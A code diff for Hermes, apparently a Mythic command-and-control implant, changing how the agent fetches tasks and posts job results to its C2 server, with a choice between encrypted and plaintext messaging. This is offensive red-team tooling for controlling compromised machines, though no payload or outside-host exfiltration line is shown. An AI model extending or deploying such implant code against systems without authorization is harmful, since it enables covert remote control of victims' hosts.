@@ -98,11 +98,17 @@ func getTasking(jobList: JobList) throws {
         "tasking_size": -1,
     ])
     
-    // Decode negotiated b64 session key from agent config
-    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
-    
-    // Send Hermes message, get Mythic response, decrypt and decode
-    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "get")
+    // Send Hermes message based on encryption mode
+    let jsonResponse: JSON
+    if agentConfig.encryptedExchangeCheck {
+        // Decode negotiated b64 session key from agent config
+        let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
+        // Send encrypted Hermes message through the active C2 profile
+        jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey)
+    } else {
+        // Send plaintext Hermes message through the active C2 profile
+        jsonResponse = sendPlaintextHermesMessage(jsonMessage: jsonPayload)
+    }
     print("GET_TASKING", jsonResponse)
     let jsonTasks = jsonResponse["tasks"]
     
@@ -465,11 +471,18 @@ func postResponse(jobList: JobList) {
         "responses": jsonJobOutput,
     ])
     print("HERMES_POST_RESPONSE", jsonPayload)
-    // Decode negotiated b64 session key from agent config
-    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
     
-    // Send Hermes message, get Mythic response, decrypt and decode
-    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "post")
+    // Send Hermes message based on encryption mode
+    let jsonResponse: JSON
+    if agentConfig.encryptedExchangeCheck {
+        // Decode negotiated b64 session key from agent config
+        let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
+        // Send encrypted Hermes message through the active C2 profile
+        jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey)
+    } else {
+        // Send plaintext Hermes message through the active C2 profile
+        jsonResponse = sendPlaintextHermesMessage(jsonMessage: jsonPayload)
+    }
     print("MYTHIC_POST_RESPONSE", jsonResponse)
     let jsonResponses = jsonResponse["responses"]
     
